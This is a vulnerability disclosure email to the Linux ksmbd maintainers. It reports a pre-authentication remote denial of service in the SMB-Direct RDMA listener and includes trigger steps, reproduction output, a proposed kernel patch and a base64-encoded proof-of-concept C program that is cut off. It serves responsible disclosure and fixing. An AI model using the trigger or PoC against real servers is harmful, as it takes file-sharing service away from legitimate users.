Received: from mail-ed2-f31.google.com (mail-ed2-f31.google.com [74.125.228.95])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0F7C83242BD
	for <linux-cifs@vger.kernel.org>; Sat,  3 Oct 2026 01:22:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.228.95
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790990529; cv=pass; b=Vl3o+t9Hctlc+GBR11G8xByf7xNAZLKeg/f55Fjfz4LcFWbNVPsmsT11oIsWYRLtQlB8Q/JklgsQIIMvm1OssKig/FY7tcjyZwg2MrsqLv7bITRuaPWGdrrGzlMgzmVrkELihso68Obn+Pn2lvJbqyyrStaZ8rc/0mOS7Qbyegs=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790990529; c=relaxed/simple;
	bh=UrX73Kxps4+LbPAoZ4ykfNeYSzWzOAmNUUDUL4RBXQE=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=ibNlfGTlKN0+eBFIv0CwdYPlA5BC3MP1svcQnx1IutyutOzygyT276FzyH7SzRsUKrUaqOMgVoHWj7P+uHQjJ2/G/nvt9b/vdZ4OjhZqc1pYpKX62vreAETXxloK0oP6RuIAhAgljufS/UhKn0W9cq813BEBpUcQXgDG8oVDauM=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=lFCxodjR; arc=pass smtp.client-ip=74.125.228.95
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="lFCxodjR"
Received: by mail-ed2-f31.google.com with SMTP id 4fb4d7f45d1cf-6ae19319854so33839a12.3
        for <linux-cifs@vger.kernel.org>; Fri, 02 Oct 2026 18:22:03 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1790990521; cv=none;
        d=google.com; s=arc-20260327;
        b=ULmcS9CD8GB9+1oqhTrODhUYel+h8GcH6LnB5ZSKsLQvHGo2xUL+XgK59EMFK1VWeR
         J13ctPWO6CIdi/TA6ZFdPzYcHW0R33rZJ6QANbVYVI65RzaFPtibRA8reR2br3jMnT0g
         RzB9GmEF0NFfnZ6UFnoKiclyoFpdLGcKr/c/n9F8v4qpusrKX/zUTxn8cGeyV2YlmJmP
         MgvWMyJi0aOwjGBjKzoN4z5zmjHo0JbaMrwiRkycC5l/y6ZUF7zTyaIFL7tPyCvYbaAb
         CG/gdfZ+CIv/WkNVJxFcABxehiNaMlztyrgLOiLF0KcOFcP8+lctnlBmlytIE5Jt2UZK
         xwnA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=tt0SngvSEscODiFFMQJ1kfeXlJPY88K7MguV1m7ch20=;
        fh=8Iru1ZaB54XDN8K8MxoOeeGk5dImS6AoLtRPSBFaY7U=;
        b=L5IyL/TfLIe8zRS387KANiNpJbCL8rLB8i05deVY8Qn/PnMI3v1AZ4HvsM6Wipfnyb
         6lUlEjqywgkv9arT5TnuLfAqxl4OK7ITkd8oYukTlNPuIwytyGdLFPKx1Tc2ZEKPd4qW
         2oTliL4Ct41fxnr1WrrTC3aVLvLo75O9W2p1f6+pwoqj8EXWD2USM1I7+3uNgZQYA0VM
         j6xW456/CUVkhA+ALBVtVi20qFrcymWYQ2NW45gN/HgfdtAEU1+UHF0CxHfjGFrTWFHA
         eh1vL5jaJ4blTcyTEo/noeNgtC1aajKfzWcvPdRQqQiWSfFdbkguhJWAov59uCj/bdAz
         PT+w==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790990521; x=1791595321; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
         :to:cc:subject:date:message-id:reply-to:content-type;
        bh=tt0SngvSEscODiFFMQJ1kfeXlJPY88K7MguV1m7ch20=;
        b=lFCxodjRfffcziiXfwwlHwB5W8bczLwkSOeQWVB/qWlSR438AJRTpyLALWIG6adMdC
         yqhQqYjUkrhFhCbLNWlRXR3Zfvyk9NgQkALDq40eNxQKFVoCO5wjCJ81lgcTBgjFgg/L
         3n38vpAzJgVvCYH6HL2W2IUPeP303V9CQzZMtLQQU2rKYPbacr52fy6dofRj2eJZxHW6
         3Vm6nKbjP5Urhd76EqrRv4lheddMfUeBN0eIHugTACab9s0xfleNw2iNeWSGhQjr8Abk
         GNSM9PbjcjYvlRIdWcp82uq4cf0sAWasFaWEDy0BQRO3Ca2MJwhNaqWJrwgZtHO1hHCd
         P3lA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790990521; x=1791595321;
        h=content-type:cc:to:subject:message-id:date:from:mime-version
         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to:content-type;
        bh=tt0SngvSEscODiFFMQJ1kfeXlJPY88K7MguV1m7ch20=;
        b=piic1OAV4HKNkWxogOIXHyLLwzMnBSNEqXAo66TN4vsD5occZBS395eXSfQ4DKEqa1
         yGcaLO/OX/Rsh7KB1p7+Ggn6tToc1ceB+IDYTEQff5jkDGNUZ1Hi+oQWAP2ZBXQLXDdM
         3auTVsnSeTlWlPpxr3ybsIur6sugjOYjyRnZnWidS0KK0XyAC7yzRfZDI3oWTBRTnLNk
         mbvkZF0z9FHsbpdsqshstp19xGuMiIw037cTYtL6jMQCMg3sG00toaR1sSMsnrK9sP0Y
         L8b6/Qj3QHRPnVZ1Zu9UqGuBsvHh2EJx0JzBtaf4OR5uhVGUPWjKl00XRU6xnnb3Q2VV
         hAYA==
X-Forwarded-Encrypted: i=1; AKwUvBwHZpLL4IAfTiLUxpr//x7yENmhQ5rBnCeUdB2Oi19YIRBw8Nfne1B+FLydXTgO1ZY/uP8fO7dD5M1b@vger.kernel.org
X-Gm-Message-State: AFq9FYLpeYpvs2bq2UaCO+2a3cXMTvGq2SacS2F4i9tp7FkmB7D++Yek
	UgrrVQAehLesglJrmfOqtojeRRZA4qYyBZyD4TeuaUVkKmnfTkBttMzdF310yGpyN7HSUysfEfd
	F0alT0FkxyiiMtzhXrw+HxdBjV7V++uCUrA==
X-Gm-Gg: AYBFou2uKeX/BRmNA73i5gyHuKnzFXGZhkoI0nDwqt/+RyVNHl0tEh2ZQjDtvS4OUOU
	Rj/vgxMuW1A8FuZBHxZ375RZgWgTZ8gqgDJzMWHP+pwKQfo3Z0R9mVNDW7tM7wSGKsY7Lzp39bv
	jxF6ftxJ6NkaB6lGFifwZMGUAcDK8iwMGHqxKDq11ViQi0dS5Ry4KIIUpl+xEMafyCmQPjE2m24
	Mi7yKt1GtyIwIUTNJGof5UvnCQl4s/rWyloij4G+tttC4cYxir1XsPtQi9cKC+wfEimfVFZcb+i
	qjUY18p1zWZ2wm74hj1BqxuzfF12HjujBnmNDxuPxhZM9ohQQqGl0dkfSVH2TPqB6VXr+lmjigc
	p1xwHLeIlvCMpLRDmXWz9G3GAmRkO4DyKL6ca
X-Received: by 2002:a05:6402:a0ce:b0:6a9:df42:8cba with SMTP id
 4fb4d7f45d1cf-6af9e3010ffmr2753746a12.32.1790990521081; Fri, 02 Oct 2026
 18:22:01 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: =?UTF-8?B?66CI65Oc7YyA7ZWY6rOg7Iu27Ja07JqU?= <ihopenre@gmail.com>
Date: Sat, 3 Oct 2026 08:21:47 +0700
X-Gm-Features: AclHuK-nd4tR-urrBg_ZxtnSGl8xLqQX3GkJ8dolnp0qeqv3hcOBGLUb4HEZNU4
Message-ID: <CANTrAmxL5sWU8Sn29JAGZvSq5PBB2OA+VKA0MHsZJMesagtfzA@mail.gmail.com>
Subject: ksmbd: pre-auth remote DoS via SMB-Direct listener backlog slot leak
To: linkinjeon@kernel.org
Cc: sfrench@samba.org, metze@samba.org, tom@talpey.com, 
	linux-cifs@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000ce58c2065ce5791b"

--000000000000ce58c2065ce5791b
Content-Type: text/plain; charset="UTF-8"

Hi Namjae,

I found a pre-authentication remote denial of service in ksmbd's
SMB-Direct transport. An unauthenticated peer can permanently stop the
server from accepting any new RDMA connection using about ten RDMA
connections, with no valid credentials and without completing the
SMB-Direct negotiate.

This affects deployments that run ksmbd with SMB-Direct over an RDMA
device (CONFIG_SMB_SERVER_SMBDIRECT). It does not affect the plain TCP
transport.

Summary

The SMB-Direct listener keeps accepted connections on a fixed-size
backlog (listen.pending, limit 10). A connection is removed from that
backlog only on the success path: promotion to listen.ready after a
completed negotiate, dequeue by the accept path, or a synchronous
failure during connect-request setup. A connection that is accepted
onto the backlog and then disconnects before completing the negotiate
is never removed from the listener's pending list. The slot is leaked.
After ten such events the listener rejects every further connection.

Root Cause

On an incoming RDMA connect request, smbdirect_listen_connect_request()
(fs/smb/smbdirect/listen.c) checks the backlog, then adds the new child
socket to lsc->listen.pending and calls
smbdirect_accept_connect_request(), which does rdma_accept() and arms
the negotiate timeout.

The child is taken off listen.pending in only three places, all on the
success path:

  - smbdirect_accept.c, after a valid negotiate: list_del() from pending
    and list_add_tail() to listen.ready.
  - the accept path: dequeue from listen.ready.
  - listen.c: synchronous failure of accept_connect_request, before the
    connection is live.

If the child is accepted and then torn down before the negotiate
completes (peer disconnects, or sends a malformed negotiate), the
cleanup path does not apply. smbdirect_socket_schedule_cleanup() and
smbdirect_socket_cleanup_work() (fs/smb/smbdirect/socket.c) only walk
the pending/ready lists of a socket that is itself a listener; they
never remove a child from its parent listener's pending list. The child
stays linked in listen.pending, the pending list holds a reference so
the socket is never released, and the backlog slot is leaked permanently.

smbdirect_socket_destroy() has WARN_ONCE(sc->accept.listener), which
shows the design expects a connection to be delisted before teardown.
No code path performs that delist for a connection that dies before
negotiate.

Trigger

Repeat about eleven times:

  1. RDMA connect to the SMB-Direct listener and reach ESTABLISHED.
  2. Disconnect. Send no SMB-Direct negotiate.

Each connection leaks one backlog slot. After the backlog (10) is full,
smbdirect_listen_connect_request() logs

  ksmbd: smb_direct: Backlog[10][10] full pending[11] ready[0]

and returns -EBUSY for every new connection, including from legitimate
clients. The negotiate timeout (SMB_DIRECT_NEGOTIATE_TIMEOUT, 5 seconds)
does not reclaim the slots. The service stays down until ksmbd restarts.

Impact

  - Pre-authentication: no credentials, no completed negotiate.
  - Remote: any peer that can open an RDMA connection to port 445.
  - Permanent: slots are never reclaimed, so SMB-Direct service is dead
    until restart. Roughly ten connections are enough.
  - Availability only. No memory corruption, no information disclosure.
  - CWE-400 (Uncontrolled Resource Consumption), CWE-404 (Improper
    Resource Release).

CVSS

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5 High)

Affected

fs/smb/smbdirect/ (the shared SMB-Direct module). Confirmed on Linux
v7.3-rc2 (commit df2908090). The backlog handling in listen.c, accept.c
and socket.c is the same in current mainline.

Reproduction

Environment: a guest with ksmbd built with CONFIG_SMB_SERVER_SMBDIRECT
and an RDMA device. Soft-RoCE over loopback is enough:

  rdma link add rxe0 type rxe netdev eth0

PoC (attached, poc_smbd_dos.c, built with
gcc -O2 -o poc_smbd_dos poc_smbd_dos.c -lrdmacm -libverbs):

  ./poc_smbd_dos <server-ip>

Output on the vulnerable server:

  [*] baseline: does a legitimate client negotiate?
    victim: negotiate OK (service alive)
  [*] opening 12 pre-negotiate connections ...
      conn  1..11: ESTABLISHED ...
      conn 12: REFUSED (reject status 28) -- backlog already full
  [*] waiting 10s (> 5s negotiate_timeout) ...
  [*] legitimate client retry after the flood:
    victim: connect REFUSED (RDMA_CM reject status 28)
  [+] DoS CONFIRMED

I verified this over Soft-RoCE (rxe) on a loopback setup. I did not test
it on hardware RoCE or InfiniBand, but the backlog handling is in the
transport-independent listen/accept/socket code, so I expect the same
behaviour there.

Proposed Fix (attached: fix-smbd-backlog.patch)

Reclaim the leaked backlog slots in smbdirect_listen_connect_request(),
before the backlog check, by removing from the listener's pending and
ready lists any connection that has already been torn down
(first_error set), and releasing it. This runs in the listener context,
so the release is safe there, and it mirrors the delist that the
success and listener-teardown paths already perform. Doing it on the
child's own cleanup path is not an option, because that would release
the socket from inside its own disconnect_work and deadlock on
disable_work_sync().

    struct smbdirect_socket *psc, *tsc;
    LIST_HEAD(dead);
    ...
    spin_lock_irqsave(&lsc->listen.lock, flags);
    list_for_each_entry_safe(psc, tsc, &lsc->listen.ready, accept.list) {
        if (psc->first_error) {
            list_move_tail(&psc->accept.list, &dead);
            psc->accept.listener = NULL;
        }
    }
    list_for_each_entry_safe(psc, tsc, &lsc->listen.pending, accept.list) {
        if (psc->first_error) {
            list_move_tail(&psc->accept.list, &dead);
            psc->accept.listener = NULL;
        }
    }
    spin_unlock_irqrestore(&lsc->listen.lock, flags);
    list_for_each_entry_safe(psc, tsc, &dead, accept.list) {
        list_del_init(&psc->accept.list);
        smbdirect_socket_release(psc);
    }

I built this on the KASAN kernel and retested over Soft-RoCE. With the
fix: the PoC can no longer wedge the listener (30 aborted pre-negotiate
connections all accepted, a legitimate client still negotiates, no
"Backlog full"), a normal "mount -o rdma" still works, and 500
connect/abort cycles leave the service healthy with no KASAN report or
warning. This is one possible fix; you may prefer a different spot or to
reap asynchronously rather than in the connect path.

Regards,
ihopenre-eng
Github: ihopenre-eng

--000000000000ce58c2065ce5791b
Content-Type: application/octet-stream; name="fix-smbd-backlog.patch"
Content-Disposition: attachment; filename="fix-smbd-backlog.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_murpef1n1>
X-Attachment-Id: f_murpef1n1

ZGlmZiAtLWdpdCBhL2ZzL3NtYi9zbWJkaXJlY3QvbGlzdGVuLmMgYi9mcy9zbWIvc21iZGlyZWN0
L2xpc3Rlbi5jCmluZGV4IDJmNzhiY2FlZC4uMzIxNWNkMDI3IDEwMDY0NAotLS0gYS9mcy9zbWIv
c21iZGlyZWN0L2xpc3Rlbi5jCisrKyBiL2ZzL3NtYi9zbWJkaXJlY3QvbGlzdGVuLmMKQEAgLTIx
NSw2ICsyMTUsOCBAQCBzdGF0aWMgaW50IHNtYmRpcmVjdF9saXN0ZW5fY29ubmVjdF9yZXF1ZXN0
KHN0cnVjdCBzbWJkaXJlY3Rfc29ja2V0ICpsc2MsCiAJc2l6ZV90IHBzb2NrZXRzOwogCXNpemVf
dCByc29ja2V0czsKIAlpbnQgcmV0OworCXN0cnVjdCBzbWJkaXJlY3Rfc29ja2V0ICpwc2MsICp0
c2M7CisJTElTVF9IRUFEKGRlYWQpOwogCiAJaWYgKCFzbWJkaXJlY3RfZnJ3cl9pc19zdXBwb3J0
ZWQoJm5ld19pZC0+ZGV2aWNlLT5hdHRycykpIHsKIAkJc21iZGlyZWN0X2xvZ19yZG1hX2V2ZW50
KGxzYywgU01CRElSRUNUX0xPR19FUlIsCkBAIC0yNTEsNiArMjUzLDM2IEBAIHN0YXRpYyBpbnQg
c21iZGlyZWN0X2xpc3Rlbl9jb25uZWN0X3JlcXVlc3Qoc3RydWN0IHNtYmRpcmVjdF9zb2NrZXQg
KmxzYywKIAkJcmV0dXJuIC1FUFJPVE9OT1NVUFBPUlQ7CiAJfQogCisJLyoKKwkgKiBSZWNsYWlt
IGJhY2tsb2cgc2xvdHMgZnJvbSBjb25uZWN0aW9ucyB0aGF0IHdlcmUgcHV0IG9uIHRoZQorCSAq
IHBlbmRpbmcgb3IgcmVhZHkgbGlzdCBidXQgdGhlbiBkaWVkIGJlZm9yZSB0aGUgdXBwZXIgbGF5
ZXIKKwkgKiBhY2NlcHRlZCB0aGVtLCBlLmcuIGFuIHVuYXV0aGVudGljYXRlZCBwZWVyIHRoYXQg
Y29ubmVjdHMgYW5kCisJICogZGlzY29ubmVjdHMgYmVmb3JlIGNvbXBsZXRpbmcgdGhlIG5lZ290
aWF0ZS4gU3VjaCBhIGNvbm5lY3Rpb24KKwkgKiBpcyBvbmx5IHJlbW92ZWQgZnJvbSB0aGUgbGlz
dGVuZXIgbGlzdHMgb24gdGhlIHN1Y2Nlc3MgcGF0aHMKKwkgKiAocHJvbW90aW9uIHRvIHJlYWR5
LCBhY2NlcHQgZGVxdWV1ZSkgb3Igb24gbGlzdGVuZXIgdGVhcmRvd24sIHNvCisJICogd2l0aG91
dCB0aGlzIGl0cyBzbG90IHdvdWxkIGJlIGxlYWtlZCBhbmQgdGhlIGJhY2tsb2cgd291bGQgZmls
bAorCSAqIHVwIHBlcm1hbmVudGx5LiBmaXJzdF9lcnJvciBpcyBzZXQgb25jZSB0aGUgY29ubmVj
dGlvbiBpcyB0b3JuCisJICogZG93biwgc28gdXNlIGl0IHRvIGlkZW50aWZ5IHRoZSBkZWFkIG9u
ZXMuCisJICovCisJc3Bpbl9sb2NrX2lycXNhdmUoJmxzYy0+bGlzdGVuLmxvY2ssIGZsYWdzKTsK
KwlsaXN0X2Zvcl9lYWNoX2VudHJ5X3NhZmUocHNjLCB0c2MsICZsc2MtPmxpc3Rlbi5yZWFkeSwg
YWNjZXB0Lmxpc3QpIHsKKwkJaWYgKHBzYy0+Zmlyc3RfZXJyb3IpIHsKKwkJCWxpc3RfbW92ZV90
YWlsKCZwc2MtPmFjY2VwdC5saXN0LCAmZGVhZCk7CisJCQlwc2MtPmFjY2VwdC5saXN0ZW5lciA9
IE5VTEw7CisJCX0KKwl9CisJbGlzdF9mb3JfZWFjaF9lbnRyeV9zYWZlKHBzYywgdHNjLCAmbHNj
LT5saXN0ZW4ucGVuZGluZywgYWNjZXB0Lmxpc3QpIHsKKwkJaWYgKHBzYy0+Zmlyc3RfZXJyb3Ip
IHsKKwkJCWxpc3RfbW92ZV90YWlsKCZwc2MtPmFjY2VwdC5saXN0LCAmZGVhZCk7CisJCQlwc2Mt
PmFjY2VwdC5saXN0ZW5lciA9IE5VTEw7CisJCX0KKwl9CisJc3Bpbl91bmxvY2tfaXJxcmVzdG9y
ZSgmbHNjLT5saXN0ZW4ubG9jaywgZmxhZ3MpOworCWxpc3RfZm9yX2VhY2hfZW50cnlfc2FmZShw
c2MsIHRzYywgJmRlYWQsIGFjY2VwdC5saXN0KSB7CisJCWxpc3RfZGVsX2luaXQoJnBzYy0+YWNj
ZXB0Lmxpc3QpOworCQlzbWJkaXJlY3Rfc29ja2V0X3JlbGVhc2UocHNjKTsKKwl9CisKIAlzcGlu
X2xvY2tfaXJxc2F2ZSgmbHNjLT5saXN0ZW4ubG9jaywgZmxhZ3MpOwogCXBzb2NrZXRzID0gbGlz
dF9jb3VudF9ub2RlcygmbHNjLT5saXN0ZW4ucGVuZGluZyk7CiAJcnNvY2tldHMgPSBsaXN0X2Nv
dW50X25vZGVzKCZsc2MtPmxpc3Rlbi5yZWFkeSk7Cg==
--000000000000ce58c2065ce5791b
Content-Type: application/octet-stream; name="poc_smbd_dos.c"
Content-Disposition: attachment; filename="poc_smbd_dos.c"
Content-Transfer-Encoding: base64
Content-ID: <f_murpef180>
X-Attachment-Id: f_murpef180

Ly8gcG9jX3NtYmRfZG9zLmMgIC0tICBrc21iZCBTTUItRGlyZWN0IHByZS1hdXRoIHJlbW90ZSBE
b1MgUG9DCi8vCi8vIERlbW9uc3RyYXRlcyBhIHBlcm1hbmVudCBkZW5pYWwgb2Ygc2VydmljZSBv
ZiBrc21iZCdzIFNNQi1EaXJlY3QgKFJETUEpCi8vIGxpc3RlbmVyIGJ5IGFuIHVuYXV0aGVudGlj
YXRlZCByZW1vdGUgcGVlci4KLy8KLy8gUm9vdCBjYXVzZSAoZnMvc21iL3NtYmRpcmVjdC8sIExp
bnV4IHY3LjMpOgovLyAgIHNtYmRpcmVjdF9saXN0ZW5fY29ubmVjdF9yZXF1ZXN0KCkgYWRkcyBl
YWNoIGFjY2VwdGVkIGNvbm5lY3Rpb24gdG8gdGhlCi8vICAgbGlzdGVuZXIncyBsaXN0ZW4ucGVu
ZGluZyBsaXN0IChsaXN0ZW4uYykuIEEgY29ubmVjdGlvbiBpcyByZW1vdmVkIGZyb20KLy8gICB0
aGF0IGxpc3QgT05MWSBvbiB0aGUgaGFwcHkgcGF0aDogcHJvbW90aW9uIHRvIGxpc3Rlbi5yZWFk
eSBhZnRlciBhCi8vICAgc3VjY2Vzc2Z1bCBTTUItRGlyZWN0IG5lZ290aWF0ZSAoYWNjZXB0LmMp
LCBhY2NlcHQoKSBkZXF1ZXVlIChhY2NlcHQuYyksCi8vICAgb3Igc3luY2hyb25vdXMgY29ubmVj
dC1yZXF1ZXN0IHNldHVwIGZhaWx1cmUgKGxpc3Rlbi5jKS4gQSBjb25uZWN0aW9uCi8vICAgdGhh
dCBpcyBhY2NlcHRlZCBidXQgdGhlbiBkaXNjb25uZWN0cyBCRUZPUkUgY29tcGxldGluZyB0aGUg
bmVnb3RpYXRlIGlzCi8vICAgbmV2ZXIgcmVtb3ZlZCBmcm9tIGxpc3Rlbi5wZW5kaW5nIC0tIGl0
cyBjbGVhbnVwIHBhdGggbmV2ZXIgZGVsaXN0cyBpdAovLyAgIGZyb20gdGhlIHBhcmVudCBsaXN0
ZW5lci4gVGhlIGJhY2tsb2cgc2xvdCAoaGFyZGNvZGVkIDEwIHZpYQovLyAgIHNtYmRpcmVjdF9z
b2NrZXRfbGlzdGVuKHNjLDEwKSkgaXMgbGVha2VkIHBlcm1hbmVudGx5LiBBZnRlciAxMCBzdWNo
Ci8vICAgZXZlbnRzLCBzbWJkaXJlY3RfbGlzdGVuX2Nvbm5lY3RfcmVxdWVzdCgpIHJlamVjdHMg
ZXZlcnkgbmV3IGNvbm5lY3Rpb24KLy8gICB3aXRoIC1FQlVTWSAoIkJhY2tsb2cgZnVsbCIpLCBk
ZW55aW5nIHNlcnZpY2UgdG8gYWxsIGxlZ2l0aW1hdGUgY2xpZW50cwovLyAgIHVudGlsIGtzbWJk
IGlzIHJlc3RhcnRlZC4gbmVnb3RpYXRlX3RpbWVvdXQgKDVzKSBkb2VzIE5PVCByZWNsYWltIHRo
ZSBzbG90LgovLwovLyBVc2FnZSAocnVuIGFnYWluc3QgYSBrc21iZCBob3N0IHdpdGggU01CLURp
cmVjdCBlbmFibGVkIG92ZXIgYW4gUkRNQSBkZXZpY2U7Ci8vIGxvb3BiYWNrIG92ZXIgU29mdC1S
b0NFIHdvcmtzOiBgcmRtYSBsaW5rIGFkZCByeGUwIHR5cGUgcnhlIG5ldGRldiA8bmljPmApOgov
LwovLyAgICAgLi9wb2Nfc21iZF9kb3MgPHNlcnZlci1pcD4gW2F0dGVtcHRzXQovLwovLyBJdCBv
cGVucyBgYXR0ZW1wdHNgIChkZWZhdWx0IDEyKSBjb25uZWN0aW9ucyB0aGF0IGVzdGFibGlzaCBh
bmQgZGlzY29ubmVjdAovLyB3aXRob3V0IG5lZ290aWF0aW5nLCB0aGVuIHRyaWVzIG9uZSBsZWdp
dGltYXRlIG5lZ290aWF0ZSBhbmQgcmVwb3J0cyB3aGV0aGVyCi8vIHRoZSBzZXJ2aWNlIGlzIGRl
YWQuCi8vCi8vIEJ1aWxkOiBnY2MgLU8yIC1vIHBvY19zbWJkX2RvcyBwb2Nfc21iZF9kb3MuYyAt
bHJkbWFjbSAtbGlidmVyYnMKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4K
I2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDx1bmlzdGQu
aD4KI2luY2x1ZGUgPHBvbGwuaD4KI2luY2x1ZGUgPGFycGEvaW5ldC5oPgojaW5jbHVkZSA8cmRt
YS9yZG1hX2NtYS5oPgojaW5jbHVkZSA8aW5maW5pYmFuZC92ZXJicy5oPgoKI2RlZmluZSBTTUJE
X1BPUlQgNDQ1ICAgICAgICAgIC8qIGtzbWJkIHNtYmRpcmVjdCBSRE1BLUNNIGxpc3RlbmVyIChJ
Qi9Sb0NFIHJhbmdlKSAqLwojZGVmaW5lIFNNQkRJUkVDVF9WMSAweDAxMDAKI2RlZmluZSBCVUZT
WiA1MTIKCnN0cnVjdCBfX2F0dHJpYnV0ZV9fKChwYWNrZWQpKSBuZWdvdGlhdGVfcmVxIHsKCXVp
bnQxNl90IG1pbl92ZXJzaW9uLCBtYXhfdmVyc2lvbiwgcmVzZXJ2ZWQsIGNyZWRpdHNfcmVxdWVz
dGVkOwoJdWludDMyX3QgcHJlZmVycmVkX3NlbmRfc2l6ZSwgbWF4X3JlY2VpdmVfc2l6ZSwgbWF4
X2ZyYWdtZW50ZWRfc2l6ZTsKfTsKc3RydWN0IF9fYXR0cmlidXRlX18oKHBhY2tlZCkpIG5lZ290
aWF0ZV9yZXNwIHsKCXVpbnQxNl90IG1pbl92ZXJzaW9uLCBtYXhfdmVyc2lvbiwgbmVnb3RpYXRl
ZF92ZXJzaW9uLCByZXNlcnZlZDsKCXVpbnQxNl90IGNyZWRpdHNfcmVxdWVzdGVkLCBjcmVkaXRz
X2dyYW50ZWQ7Cgl1aW50MzJfdCBzdGF0dXMsIG1heF9yZWFkd3JpdGVfc2l6ZSwgcHJlZmVycmVk
X3NlbmRfc2l6ZSwgbWF4X3JlY2VpdmVfc2l6ZSwgbWF4X2ZyYWdtZW50ZWRfc2l6ZTsKfTsKCnN0
cnVjdCBjdHggewoJc3RydWN0IHJkbWFfZXZlbnRfY2hhbm5lbCAqZWM7CglzdHJ1Y3QgcmRtYV9j
bV9pZCAqaWQ7CglzdHJ1Y3QgaWJ2X3BkICpwZDsKCXN0cnVjdCBpYnZfY3EgKmNxOwoJc3RydWN0
IGlidl9tciAqc21yLCAqcm1yOwoJdWludDhfdCAqc2J1ZiwgKnJidWY7CglpbnQgcmVqZWN0X3N0
YXR1czsgICAgIC8qIENNIHJlamVjdCBzdGF0dXMgaWYgY29ubmVjdCB3YXMgcmVmdXNlZCAqLwp9
OwoKc3RhdGljIGludCB3YWl0X2V2ZW50KHN0cnVjdCBjdHggKmMsIGVudW0gcmRtYV9jbV9ldmVu
dF90eXBlIHdhbnQpCnsKCXN0cnVjdCByZG1hX2NtX2V2ZW50ICpldjsKCWlmIChyZG1hX2dldF9j
bV9ldmVudChjLT5lYywgJmV2KSkgcmV0dXJuIC0xOwoJZW51bSByZG1hX2NtX2V2ZW50X3R5cGUg
dCA9IGV2LT5ldmVudDsKCWludCBzdCA9IGV2LT5zdGF0dXM7CglyZG1hX2Fja19jbV9ldmVudChl
dik7CglpZiAodCAhPSB3YW50KSB7CgkJaWYgKHQgPT0gUkRNQV9DTV9FVkVOVF9SRUpFQ1RFRCkg
Yy0+cmVqZWN0X3N0YXR1cyA9IHN0OwoJCXJldHVybiAtMTsKCX0KCXJldHVybiAwOwp9CgovLyBF
c3RhYmxpc2ggYW4gUkMgUVAgdG8gdGhlIGtzbWJkIFNNQi1EaXJlY3QgbGlzdGVuZXIuIFJldHVy
bnMgMCBvbiBFU1RBQkxJU0hFRC4Kc3RhdGljIGludCBjb25uZWN0X3FwKHN0cnVjdCBjdHggKmMs
IGNvbnN0IGNoYXIgKmlwKQp7CglzdHJ1Y3Qgc29ja2FkZHJfaW4gc2EgPSB7IC5zaW5fZmFtaWx5
ID0gQUZfSU5FVCwgLnNpbl9wb3J0ID0gaHRvbnMoU01CRF9QT1JUKSB9OwoJaW5ldF9wdG9uKEFG
X0lORVQsIGlwLCAmc2Euc2luX2FkZHIpOwoJYy0+cmVqZWN0X3N0YXR1cyA9IC0xOwoKCWMtPmVj
ID0gcmRtYV9jcmVhdGVfZXZlbnRfY2hhbm5lbCgpOwoJaWYgKCFjLT5lYykgcmV0dXJuIC0xOwoJ
aWYgKHJkbWFfY3JlYXRlX2lkKGMtPmVjLCAmYy0+aWQsIE5VTEwsIFJETUFfUFNfVENQKSkgcmV0
dXJuIC0xOwoJaWYgKHJkbWFfcmVzb2x2ZV9hZGRyKGMtPmlkLCBOVUxMLCAoc3RydWN0IHNvY2th
ZGRyICopJnNhLCAyMDAwKSkgcmV0dXJuIC0xOwoJaWYgKHdhaXRfZXZlbnQoYywgUkRNQV9DTV9F
VkVOVF9BRERSX1JFU09MVkVEKSkgcmV0dXJuIC0xOwoJaWYgKHJkbWFfcmVzb2x2ZV9yb3V0ZShj
LT5pZCwgMjAwMCkpIHJldHVybiAtMTsKCWlmICh3YWl0X2V2ZW50KGMsIFJETUFfQ01fRVZFTlRf
Uk9VVEVfUkVTT0xWRUQpKSByZXR1cm4gLTE7CgoJYy0+cGQgPSBpYnZfYWxsb2NfcGQoYy0+aWQt
PnZlcmJzKTsKCWMtPmNxID0gaWJ2X2NyZWF0ZV9jcShjLT5pZC0+dmVyYnMsIDE2LCBOVUxMLCBO
VUxMLCAwKTsKCXN0cnVjdCBpYnZfcXBfaW5pdF9hdHRyIHFhID0gewoJCS5zZW5kX2NxID0gYy0+
